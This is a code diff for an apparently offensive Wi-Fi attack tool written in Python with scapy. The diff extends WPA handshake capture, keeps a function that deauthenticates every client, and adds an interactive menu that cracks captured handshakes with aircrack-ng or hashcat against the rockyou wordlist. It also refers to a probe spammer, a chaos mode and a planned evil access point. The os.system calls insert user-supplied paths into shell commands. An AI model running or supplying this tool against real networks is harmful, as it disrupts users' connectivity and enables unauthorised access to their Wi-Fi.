@@ -3,7 +3,6 @@ import os
 import sys
 import time
 import json
-import subprocess
 from scapy.all import *
 from threading import Thread
 from random import choice, randint
@@ -42,7 +41,6 @@ def packet_handler(pkt):
             seen_aps[bssid] = ssid
             scan_results[bssid] = {"ssid": ssid, "clients": []}
             print(f"📶 AP: {ssid:<25} BSSID: {bssid}")
-
     if pkt.haslayer(Dot11) and pkt.type == 2:
         src = pkt.addr2
         bssid = pkt.addr3
@@ -68,7 +66,7 @@ def capture_handshake(iface, bssid):
     path = f"loot/handshake_{bssid.replace(':','')}.pcap"
     print(f"📡 Capturing handshake to {bssid}, saving to {path}")
     def eapol(pkt): return pkt.haslayer(EAPOL) and pkt.addr2 == bssid
-    pkts = sniff(iface=iface, lfilter=eapol, timeout=30)
+    pkts = sniff(iface=iface, lfilter=eapol, timeout=60)
     if pkts:
         wrpcap(path, pkts)
         print(f"✅ Saved handshake to {path}")
@@ -105,28 +103,62 @@ def deauth_all():
             print(f"🚀 Deauthed {client} from {data['ssid']}")
 
 def crack_handshakes():
-    loot_dir = "loot"
-    if not os.path.exists(loot_dir):
-        print("⚠️ Loot folder not found.")
+    print("\n💜 Choose cracking mode:")
+    print("1. Auto-detect handshakes in loot/ folder")
+    print("2. Provide path to custom handshake file")
+    mode = input("💜 Option: ").strip()
+
+    if mode == "1":
+        loot_dir = "loot"
+        if not os.path.exists(loot_dir):
+            print("⚠️ Loot folder not found.")
+            return
+        pcaps = [f for f in os.listdir(loot_dir) if f.endswith((".pcap", ".cap", ".hccapx"))]
+        if not pcaps:
+            print("⚠️ No handshake files found.")
+            return
+        for i, p in enumerate(pcaps):
+            print(f"{i+1}. {p}")
+        try:
+            idx = int(input("💜 Choose file number: ")) - 1
+            file_path = os.path.join(loot_dir, pcaps[idx])
+        except:
+            print("⚠️ Invalid selection.")
+            return
+    elif mode == "2":
+        file_path = input("💜 Enter full path to .pcap/.cap/.hccapx file: ").strip()
+        if not os.path.isfile(file_path):
+            print("❌ File not found.")
+            return
+    else:
+        print("⚠️ Invalid mode selected.")
         return
-    pcaps = [f for f in os.listdir(loot_dir) if f.endswith(".pcap")]
-    if not pcaps:
-        print("⚠️ No handshake files found.")
-        return
-    for i, p in enumerate(pcaps):
-        print(f"{i+1}. {p}")
-    try:
-        idx = int(input("💜 Choose file number: ")) - 1
-        pcap = os.path.join(loot_dir, pcaps[idx])
-    except:
-        print("⚠️ Invalid selection.")
-        return
-    wordlist = input("📚 Wordlist (default rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
+
+    print("\n💜 Choose tool:")
+    print("1. Aircrack-ng")
+    print("2. Hashcat")
+    tool = input("💜 Option: ").strip()
+
+    wordlist = input("📚 Path to wordlist (default rockyou.txt): ").strip()
+    if not wordlist:
+        wordlist = "/usr/share/wordlists/rockyou.txt"
     if not os.path.isfile(wordlist):
         print("❌ Wordlist not found!")
         return
-    print("✨ Cracking the handshake like it’s a mystery in a teen drama... 🔍")
-    os.system(f"aircrack-ng {pcap} -w {wordlist}")
+
+    if tool == "1":
+        print("✨ Cracking with Aircrack-ng... 🔍")
+        os.system(f"aircrack-ng '{file_path}' -w '{wordlist}'")
+
+    elif tool == "2":
+        if not file_path.endswith(".hccapx"):
+            hccapx_path = file_path.rsplit(".", 1)[0] + ".hccapx"
+            print(f"🔄 Converting {file_path} to {hccapx_path}...")
+            os.system(f"cap2hccapx '{file_path}' '{hccapx_path}'")
+        else:
+            hccapx_path = file_path
+        print("🐉 Cracking with Hashcat... use Ctrl+C to stop anytime.")
+        os.system(f"hashcat -m 22000 '{hccapx_path}' '{wordlist}' --force")
 
 def probe_spammer():
     iface = input("💜 Monitor mode interface: ").strip()
@@ -181,9 +213,6 @@ def chaos_mode():
         time.sleep(2)
     print("💥 Chaos mode complete!")
 
-def evil_ap():
-    print("👿 Evil AP coming soon! Will mimic target SSID with optional portal.")
-
 def loot_viewer():
     loot_dir = "loot"
     if not os.path.exists(loot_dir):
@@ -192,7 +221,9 @@ def loot_viewer():
     for f in os.listdir(loot_dir):
         print(f"📁 {f}")
 
-# 💫 Menu
+def evil_ap():
+    print("👿 Evil AP coming soon! Will mimic target SSID with optional portal.")
+
 def main():
     print_banner()
     while True:
